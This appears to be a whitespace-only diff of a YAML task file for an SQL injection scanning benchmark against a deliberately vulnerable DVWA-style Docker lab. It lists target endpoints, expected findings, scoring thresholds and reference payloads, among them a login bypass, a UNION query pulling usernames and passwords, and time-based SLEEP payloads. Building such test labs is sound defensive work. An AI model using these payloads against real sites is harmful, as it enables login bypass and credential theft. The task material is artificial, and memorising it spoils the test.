@@ -11,7 +11,7 @@ description: |
   - Blind SQL injection (time-based)
   - Union-based SQL injection
   - Second-order SQL injection
-  
+
   Targets include login forms, search fields, and URL parameters.
 
 category: vulnerability_scan
@@ -48,7 +48,7 @@ target_endpoints:
       - name: "password"
         type: "password"
         vulnerable: false
-        
+
   - path: "/search.php"
     method: "GET"
     parameters:
@@ -56,7 +56,7 @@ target_endpoints:
         type: "text"
         vulnerable: true
         injection_type: "union_based"
-        
+
   - path: "/product.php"
     method: "GET"
     parameters:
@@ -77,7 +77,7 @@ expected_findings:
       Payload: admin' OR '1'='1' --
     verification_method: "sqlmap"
     exploit_available: true
-    
+
   - vuln_type: sql_injection
     severity: high
     location: "/search.php - q parameter"
@@ -88,7 +88,7 @@ expected_findings:
       Payload: ' UNION SELECT username,password FROM users--
     verification_method: "sqlmap"
     exploit_available: true
-    
+
   - vuln_type: blind_sql_injection
     severity: high
     location: "/product.php - id parameter"
@@ -99,7 +99,7 @@ expected_findings:
       Payload: 1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
     verification_method: "sqlmap"
     exploit_available: true
-    
+
   - vuln_type: information_disclosure
     severity: medium
     location: "Database error messages"
@@ -122,7 +122,7 @@ parameters:
   test_url_parameters: true
   test_headers: false
   test_cookies: true
-  
+
 # Success Criteria
 min_detection_rate: 0.75
 max_false_positive_rate: 0.15
@@ -149,7 +149,7 @@ docker_compose: |
         - MYSQL_PASS=dvwa
       networks:
         - sqli-net
-    
+
     db:
       image: mysql:5.7
       environment:
@@ -168,7 +168,7 @@ success_indicators:
   - "At least 2 SQL injection vulnerabilities detected"
   - "Injection type correctly identified"
   - "Affected parameter identified"
-  
+
 # Reference Payloads for Verification
 reference_payloads:
   error_based:
@@ -176,12 +176,12 @@ reference_payloads:
     - "''"
     - "1' AND 1=1 --"
     - "1' AND 1=2 --"
-  
+
   union_based:
     - "' UNION SELECT NULL--"
     - "' UNION SELECT NULL,NULL--"
     - "' UNION SELECT username,password FROM users--"
-  
+
   blind_time_based:
     - "1 AND SLEEP(5)"
     - "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)"
